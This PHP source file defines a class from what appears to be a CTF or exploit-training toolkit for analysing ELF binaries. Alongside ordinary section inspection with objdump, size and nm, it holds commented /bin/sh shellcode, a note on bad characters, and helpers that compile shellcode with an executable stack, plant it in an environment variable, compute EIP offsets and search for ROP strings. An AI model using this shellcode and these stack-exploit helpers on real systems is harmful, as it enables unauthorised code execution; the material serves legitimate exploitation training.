<?php
/*
 CTF Events :
 https://ctftime.org/event/list/upcoming
 http://captf.com/practice-ctf/
 http://resources.infosecinstitute.com/tools-of-trade-and-resources-to-prepare-in-a-hacker-ctf-competition-or-challenge/#gref
 
 https://github.com/cmu-sei/pharos
 */
class BIN extends FILE {
	
	/*
	 - excluding the "bad" characters (ex: msfvenom -b '\x00\xff')
- some common "bad" characters:
- 0x00 - null byte (bad when the code is read as string)
- 0x0d - chariage return (\r - bad when the app ends reading after it)
- 0x0a - line feed (\n - bad when the app ends reading after it)
- 0x09 - TAB (\t - bad when the app ends reading after it)
- 0x20 - space

	// $shellcode_hex = '\xda\xdf\xbd\xb2\x9a\x13\x3b\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x6e\x1a\x03\x6e\x1a\x83\xee\xfc\xe2\x47\xf0\x18\x63\x3e\x57\x79\xfb\x6d\x3b\x0c\x1c\x05\x94\x7d\x8b\xd5\x82\xae\x29\xbc\x3c\x38\x4e\x6c\x29\x32\x91\x90\xa9\x6c\xf3\xf9\xc7\x5d\x80\x91\x17\xf5\x35\xe8\xf9\x34\x39';
	// $shellcode_hex = "\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80";
	
	 */
    public function __construct($stream,$bin) {
        parent::__construct($stream,$bin);
	//$this->ssTitre("avoid creating cores on crashes (speed-up)");$this->requette("echo '$this->root_passwd' | sudo -S /etc/init.d/apport stop"); 

	}
	
	
	
	function hex2exec($hex) {
	    $this->ssTitre( "HEX to EXEC");
	    /*
	     * ssTitre("Test 1");
	     * system("echo \"unsigned char shellcode[] =\\\"$hex\\\"; \nvoid main(){int *ret;ret = (int *)&ret + 2;(*ret) = (int)shellcode;}\" > $this->dir_tmp/shellcode2exec1.c; cat $this->dir_tmp/shellcode2exec1.c ");
	     * requette("gcc -m32 -z execstack $this->dir_tmp/shellcode2exec1.c -o $this->dir_tmp/shellcode2exec1; chmod +x $this->dir_tmp/shellcode2exec1");
	     * requette("$this->dir_tmp/shellcode2exec1 ");
	     * ssTitre("Test 2");
	     */
	    $hex = trim($hex);
	    $c_code = $this->hex2c($hex);
	    $hash = sha1($c_code);
	    
	    $file_path = "$this->dir_tmp/$hash";
	    //$this->str2file($c_code, "$file_path.c");
	    
	    return  $this->bin8c2code($c_code,"-m32 -z execstack ","$file_path.c");
	}
	
	
	function hex2env($hex,$nops) {
	    $raw = $this->hex2raw($hex);
	    $this->raw2env($raw, $nops);
	    return $this->shellcode2env4addr("shellcode");;
	}
	
	
	public function bin8c2code($code_c,$option_gcc,$output_filename_c) {
	    $this->ssTitre(__FUNCTION__);
	    // system("echo '$structure_memoire_processus' > $this->dir_tmp/structure_memoire_processus.c && gedit $this->dir_tmp/structure_memoire_processus.c ");
	    /*
	     * To disable stack smashing protection (aka stack canaries) compile using the -fno-stack-protector option.
	     * Rendre la Stack Executable -z execstack
	     * the -mpreferred-stack-boundary=2 option which will keep our stack 22=4 byte aligned, which will just be more convenient for us (by default -mpreferred-stack-boundary=4, that is gcc pads the stack to be 24=16 byte aligned).
	     */
	    
	    $file_w = fopen($output_filename_c, "w");
	    fwrite($file_w, $code_c);
	    fclose($file_w);
	    
	    $file_c = new FILE($output_filename_c);
	    $obj_elf = $file_c->file_c2elf($option_gcc);
	    if (is_object($obj_elf)){
	        $query = "$obj_elf->file_path";
	        $this->requette($query);
	    }
	    //$this->source2display($this->file_path);
	    //$this->requette("gedit $this->file_path 2> /dev/null");$this->pause();
	    //$this->ssTitre("Create .expand file for egypt");
	    // article("gcc -c","compile source files to object files without linking");
	    //$this->requette("gcc -c $this->file_path -fdump-rtl-expand -o $this->file_dir/$this->file_name.o -w $option_gcc"); // -Wall
	    
	    // $this->requette("strip -s $prog_path");
	    // $this->requette("gcc $file_c -fdump-rtl-expand -ggdb -o $prog_path -w $option");
	    // $this->requette("gcc -fdump-rtl-expand -c $file_c"); // -masm=intel
	    // if (! file_exists("/usr/local/bin/egypt")) 	$this->install_labs_egypt();
	    //$this->requette("egypt $this->file_dir/*.expand > $this->file_dir/$this->file_name.dot");
	    //system("rm $this->file_dir/*.expand");
	    
	    //$this->dot2xdot("$this->file_dir/$this->file_name.dot");
	    
	    //$file_bin = new bin4linux($elf);
	    //system("chmod +x $file_bin->file_path");
	    //$file_bin->elf2info();
	    //$this->requette("lsb_release -a");
	    //$this->requette("uname -a");
	    //$this->requette("gcc --version");
	    //$this->ssTitre("Check Security Option");$file_bin->elf2checksec();
	    //return $file_bin;
	}
	
	
	function shellcode2env4hex($nops,$shellcode_hex) {
	    $this->ssTitre("PUT Shellcode in ENV");
	    $shellcode_hex = trim($shellcode_hex);
	    $shellcode_raw = $this->hex2raw($shellcode_hex);
	    $this->shellcode2env4raw($nops,$shellcode_raw);
	    return $this->shellcode2env4addr("shellcode");
	    
	}
	
	public function shellcode2env4addr($shellcode_env_name) {
	    $name = "getenv";
	    
	    if (!file_exists("$this->dir_tmp/$name.elf")) $this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
	    $c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
	    $file_c = new FILE("$this->dir_tmp/$name.c");
	    //$this->requette("gedit $file_c->file_path");
	    $name_prog = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
	    
	    $query = "$name_prog $shellcode_env_name $this->file_path";
	    
	    $elf2addr4ret = $this->req_ret_str($query);
	    
	    $this->article("SHELLCODE ADDR IN ENV VAR", $elf2addr4ret);
	    // elf2string4hex($elf2addr4ret,"979");
	    // elf2opcode4hex($elf2addr4ret);
	    /*
	     * $this->titre("Check If is Good Addr");
	     * $tmp = $this->req_ret_tab("gdb -q --batch -ex \"b main\" -ex \"r AAAA\" -ex \"x/100s $elf2addr4ret\" $this->file_path | grep shellcode | tail -1 | cut -d':' -f1 ");
	     * $elf2addr4ret = trim($tmp[0]);unset($tmp);
	     * $elf2addr4ret = dechex(hexdec($elf2addr4ret)+10); // 10 (shellcode=) +(nops)
	     * $elf2addr4ret = $this->hex2norme_32($elf2addr4ret);
	     * $this->article("ADDR Real SHELLCODE IN ENV VAR", $elf2addr4ret);
	     * elf2string4hex($elf2addr4ret,"979");
	     * elf2opcode4hex($elf2addr4ret);
	     * $this->requette("gdb -q --batch -ex \"b main\" -ex \"r AAAA\" -ex \"x/s $elf2addr4ret\" $this->file_path | tail -1 ");
	     * $this->pause();
	     */
	    
	    return $elf2addr4ret;
	}
	
	
	

	function offset2eip($eip_val, $size) {
		$eip_val = trim($eip_val); $size = trim($size);
		$win_offset_eip = $this->req_ret_str( "python $this->dir_tools/bof/pattern.py offset $eip_val $size" );
		$this->article("Offset EIP", $win_offset_eip );
		return $win_offset_eip;
	}
	


		
	
	public function bin2section4text() {
	$this->titre("Content TEXT section");
	$this->ssTitre("Hex/raw Display");$this->requette("objdump -s -j .text $this->file_path  ");$this->pause();
	$this->ssTitre("opcode/asm display");$this->requette("objdump -M Intel -d -j .text $this->file_path  ");$this->pause();
	}
	

	
	

	public function bin2text2start() {
	$this->titre("START TEXT section");
	$this->requette("size -Ax $this->file_path | grep '.text' ");
	exec("size -Ax $this->file_path | grep '\.text' | tail -1 | sed \"s/\.text//g\" | sed \"s/  //g\" | cut -d' ' -f2", $tmp2);
	return $tmp2[0];
	}
	
	public function bin2data2start() {
	$this->titre("START DATA section");
	$this->requette("size -Ax $this->file_path | grep '\.data' ");
	exec("size -Ax $this->file_path | grep '\.data' | tail -1 | sed \"s/\.data//g\" | sed \"s/  //g\" | cut -d' ' -f2", $tmp2);
	return $tmp2[0];
	}
	
	public function bin2bss2content() {
	$this->titre("Content BSS section");
	$this->requette("objdump -d -s -j .bss $this->file_path");
	}
	
	
	public function bin2addr4opcode($hex) {

	}
	
	

	public function bin2addr4string_programme_all($chaine) {
	// $this->requette("ROPgadget --memstr \"$chaine\" --binary $this->file_path ");
	return $this->req_ret_tab("ROPgadget --string \"$chaine\" --binary $this->file_path ");
	}
	
	


	public function bin2opcode2asm(){
	$this->requette("objdump -M intel -d -j .text $this->file_path");
	}

	
	public function bin2bss2size() {
	$this->titre("Size BSS section ");
	$this->titre("Via Size");
	$this->requette("size -Ax $this->file_path | grep \"\.bss \" ");
	exec("size -Ax $this->file_path | grep \"\.bss \" | tail -1 | sed \"s/\.bss//g\" | sed \"s/  //g\" | cut -d' ' -f2", $tmp1);
	exec("size -Ax $this->file_path | grep \"\.bss \" | tail -1 | sed \"s/\.bss//g\" | sed \"s/  //g\" | cut -d' ' -f3", $tmp2);
	$bin2addr4tmp = sprintf("%x", $tmp2 [0] + $tmp1 [0]);
	echo "\n\tZone BSS: start: $tmp2[0] (Size: $tmp1[0]) end: 0x$bin2addr4tmp\n";
	$this->titre("Via Objdump");$this->requette("objdump -h $this->file_path | grep \"\.bss \" ");
	}
	
	
	
	public function bin2data2size() {
	$this->titre("Size DATA section");
	$this->titre("Via Size");
	$this->requette("size -Ax $this->file_path | grep \"\.data \" ");
	exec("size -Ax $this->file_path | grep \"\.data \" | tail -1 | sed \"s/\.data//g\" | sed \"s/  //g\" | cut -d' ' -f2", $tmp1);
	exec("size -Ax $this->file_path | grep \"\.data \" | tail -1 | sed \"s/\.data//g\" | sed \"s/  //g\" | cut -d' ' -f3", $tmp2);
	$bin2addr4tmp = sprintf("%x", $tmp2 [0] + $tmp1 [0]);
	$size_dec_data = hexdec($tmp1 [0]);
	echo "\n\tZone DATA: start: $tmp2[0] (Size: $tmp1[0]=$size_dec_data) end: 0x$bin2addr4tmp\n";
	$this->titre("Via Objdump");$this->requette("objdump -h $this->file_path | grep \"\.data\" ");
	}
	
	
	public function bin2data2content() {
	$this->titre("Content DATA section");
	$this->requette("objdump -s -j .data $this->file_path ");
	}
	
	public function bin2text2size() {
	$this->titre("Size TEXT section");
	$this->titre("Via Size");
	$this->requette("size -Ax $this->file_path | grep '.text' ");
	exec("size -Ax $this->file_path | grep '.text' | tail -1 | sed \"s/.text//g\" | sed \"s/  //g\" | cut -d' ' -f1", $tmp1);
	exec("size -Ax $this->file_path | grep '.text' | tail -1 | sed \"s/.text//g\" | sed \"s/  //g\" | cut -d' ' -f2", $tmp2);
	$bin2addr4tmp = sprintf("%x", $tmp2 [0] + $tmp1 [0]);
	echo "\n\tZone TEXT: start: $tmp2[0] (Size: $tmp1[0]) end: 0x$bin2addr4tmp\n";
	$this->titre("Via Objdump");$this->requette("objdump -h $this->file_path | grep '.text'");
	}
	
	
	public function bin2content_strings($options) {
	$this->titre("Display Strings from $this->file_path");
	$tmp = $this->req_ret_tab("strings $this->file_path $options");
	if (empty($tmp))
	return FALSE;
	else
	return TRUE;
	}
	
	public function bin2fonctions() {
	$this->requette("nm $this->file_path");
	$this->requette("objdump -R $this->file_path");
	}
	
	
	
	
	
}